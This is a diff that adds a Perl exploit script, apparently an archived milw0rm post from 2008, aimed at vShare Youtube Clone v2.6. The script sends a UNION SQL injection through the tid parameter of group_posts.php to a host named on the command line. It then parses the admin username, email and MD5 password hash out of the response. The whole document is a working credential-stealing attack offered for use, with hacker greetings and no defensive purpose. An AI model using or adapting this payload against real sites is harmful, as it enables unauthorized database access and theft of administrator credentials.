@@ -1,0 +1,43 @@
+#!/usr/bin/perl
+# Coded by: Saime
+# vShare Youtube Clone v2.6 (group_posts.php tid) Remote SQL Injection
+# Author: Saime
+# URL: http://www.buyscripts.in
+# Price: $10.00
+# Date: 8/05/2008
+# Greetz: BaKo,DrWh4x,optiplex,xprog,cam-man-dan,Tulle,t0pP8uZz,Inspiratio,Novalok,illuz1oN,Untamed and everyone else I forgot!
+# Site: http://h4ck-y0u.org
+use LWP;
+
+$site = @ARGV[0];
+$ua = LWP::UserAgent->new;
+
+my $injection = 'group_posts.php?tid=1+union+select+1,2,3,4,concat(username,0x3a,email,0x3a,pwd),6,7+from+signup+limit+0,1--';
+if (@ARGV < 1) {&usage;}
+else { &exploit( ) }
+
+sub exploit ( ) {
+print "[+] Exploiting...\n";
+$passres = $ua->get("http://$site/$injection");
+$exploitcon = $passres->content;
+if ($exploitcon =~ m/<b>Topic:<\/b>(.*)<b>(.*):(.*):([a-f0-9]{32})<\/b><br \/>/gmi){
+$pass = $4;
+$admin = $2;
+$email = $3;
+print "[+] Admin Password: $pass\n";
+print "[+] Admin Username: $admin\n";
+print "[+] Admin Email: $email\n";
+}
+ else {
+      print "[-] Unable To Get The Password...\n";
+      exit(0);
+  }
+}
+sub usage ( )
+{
+print "Usage: ./vshare.pl [host]\n";
+print "Example: ./vshare.pl www.site.com\n";
+exit(0);
+}
+
+# milw0rm.com [2008-05-08]
